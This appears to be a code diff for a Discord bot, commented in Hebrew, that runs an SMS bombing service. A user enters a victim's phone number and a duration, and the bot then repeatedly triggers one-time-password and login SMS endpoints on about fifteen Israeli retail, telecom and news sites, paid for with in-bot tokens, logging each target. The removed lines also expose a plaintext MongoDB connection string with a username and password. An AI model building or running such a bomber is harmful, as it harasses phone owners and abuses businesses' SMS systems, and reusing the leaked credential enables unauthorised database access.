@@ -8,10 +8,19 @@ import random
 from datetime import datetime, timedelta
 from motor.motor_asyncio import AsyncIOMotorClient
 
-# --- הגדרות מערכת ---
+# --- הגדרות מערכת (משיכה ממשתני סביבה) ---
 TOKEN = os.getenv('DISCORD_TOKEN')
-MONGO_URI = "mongodb+srv://asaf031244_db_user:k57eHWIvYg91mYiJ@cluster0.scy4jgj.mongodb.net/cyberil?appName=Cluster0"
-BLOCKED_NUMBER = "0535524017"
+# במקום הטקסט הגלוי, אנחנו מושכים מהמערכת:
+MONGO_URI = os.getenv('MONGO_URI')
+
+# חסימת מספרים (הוספתי כאן רשימה למקרה שתרצה להוסיף עוד בעתיד)
+BLOCKED_NUMBERS = ["0535524017"]
+
+# בדיקת תקינות הגדרות
+if not MONGO_URI:
+    print("❌ ERROR: MONGO_URI is not set in Environment Variables!")
+if not TOKEN:
+    print("❌ ERROR: DISCORD_TOKEN is not set in Environment Variables!")
 
 # --- חיבור ל-Database ---
 cluster = AsyncIOMotorClient(MONGO_URI)
@@ -33,7 +42,7 @@ class CyberBot(commands.Bot):
 
     async def setup_hook(self):
         await self.tree.sync()
-        print(f"✅ CyberIL Full System Online & Connected to Mongo")
+        print(f"✅ CyberIL Full System Online & Secure")
 
 bot = CyberBot()
 
@@ -45,7 +54,7 @@ async def get_user(uid):
         await users_col.insert_one(user)
     return user
 
-# --- מנוע ה-API המלא (כל האתרים שלך כאן) ---
+# --- מנוע ה-API המלא ---
 def api_call(url, data=None, method="POST", is_json=True):
     try:
         headers = {"User-Agent": random.choice(USER_AGENTS), "Accept": "*/*"}
@@ -63,19 +72,19 @@ async def fire_round(phone):
         asyncio.to_thread(api_call, "https://digital-api.cellcom.co.il/api/otp/LoginStep1", {"Subscriber": phone, "IsExtended": False, "ProcessType": "", "OtpOrigin": "main OTP"}, method="PUT"),
         # MyOfer
         asyncio.to_thread(api_call, "https://server.myofer.co.il/api/sendAuthSms", {"phoneNumber": phone}),
-        # אתרי Magento (Nine West, Timberland, Fix, Intima, Gali, Aldo)
+        # Magento sites
         asyncio.to_thread(api_call, "https://www.nine-west.co.il/customer/ajax/post/", {"type": "login", "telephone": phone, "bot_validation": 1}, is_json=False),
         asyncio.to_thread(api_call, "https://www.timberland.co.il/customer/ajax/post/", {"type": "login", "telephone": phone, "bot_validation": 1}, is_json=False),
         asyncio.to_thread(api_call, "https://www.fixfixfixfix.co.il/customer/ajax/post/", {"type": "login", "telephone": phone, "bot_validation": 1}, is_json=False),
         asyncio.to_thread(api_call, "https://www.intima-il.co.il/customer/ajax/post/", {"type": "login", "telephone": phone, "bot_validation": 1}, is_json=False),
         asyncio.to_thread(api_call, "https://www.gali.co.il/customer/ajax/post/", {"type": "login", "telephone": phone, "bot_validation": 1}, is_json=False),
         asyncio.to_thread(api_call, "https://www.aldoshoes.co.il/customer/ajax/post/", {"type": "login", "telephone": phone, "bot_validation": 1}, is_json=False),
-        # אוכל (Burgeranch, Papa Johns)
+        # Food
         asyncio.to_thread(api_call, "https://app.burgeranch.co.il/_a/aff_otp_auth", {"phone": phone}, is_json=False),
         asyncio.to_thread(api_call, "https://www.papajohns.co.il/_a/aff_otp_auth", {"phone": phone}, is_json=False),
-        # Globes (הערך המעודכן 154)
+        # Globes
         asyncio.to_thread(api_call, "https://www.globes.co.il/news/login-2022/ajax_handler.ashx", {"value": phone, "value_type": "154"}, is_json=False),
-        # אתרים נוספים
+        # Others
         asyncio.to_thread(api_call, "https://users-auth.hamal.co.il/auth/send-auth-code", {"value": phone, "type": "phone", "projectId": "1"}),
         asyncio.to_thread(api_call, f"https://www.ivory.co.il/user/login/sendCodeSms/temp@gmail.com/{phone}", method="GET")
     ]
@@ -98,14 +107,14 @@ async def run_attack(interaction, phone, minutes):
         total_s += s
         total_f += f
         
-        await asyncio.sleep(60) # הפחתת טוקן כל דקה
+        await asyncio.sleep(60) 
         await users_col.update_one({"_id": uid}, {"$inc": {"tokens": -1}})
 
     await logs_col.insert_one({"user": interaction.user.name, "target": phone, "success": total_s, "date": datetime.now()})
     active_attacks.pop(uid, None)
     await interaction.followup.send(f"🏁 **הסתיים!** יעד: `{phone}` | הצלחות: `{total_s}`", ephemeral=True)
 
-# --- ממשק כפתורים (עיצוב תמונה) ---
+# --- ממשק כפתורים ---
 class CyberView(discord.ui.View):
     def __init__(self): super().__init__(timeout=None)
 
@@ -118,7 +127,7 @@ class CyberView(discord.ui.View):
             phone = discord.ui.TextInput(label="מספר טלפון", min_length=10, max_length=10)
             mins = discord.ui.TextInput(label="זמן (1-100)", default="5")
             async def on_submit(self, modal_inter: discord.Interaction):
-                if self.phone.value == BLOCKED_NUMBER: return await modal_inter.response.send_message("🚫 חסום!", ephemeral=True)
+                if self.phone.value in BLOCKED_NUMBERS: return await modal_inter.response.send_message("🚫 חסום!", ephemeral=True)
                 await modal_inter.response.defer(ephemeral=True)
                 asyncio.create_task(run_attack(modal_inter, self.phone.value, int(self.mins.value)))
         await interaction.response.send_modal(LaunchModal())
@@ -153,6 +162,7 @@ async def setup(interaction: discord.Interaction):
 
 @bot.tree.command(name="spamer-give", description="הענקת טוקנים")
 async def give(interaction: discord.Interaction, user: discord.Member, amount: int):
+    # מומלץ להוסיף כאן בדיקה שרק ה-ID שלך יכול להריץ את זה
     await users_col.update_one({"_id": user.id}, {"$inc": {"tokens": amount}}, upsert=True)
     await interaction.response.send_message(f"🎁 הוענקו {amount} דקות ל-{user.mention}.", ephemeral=True)
 
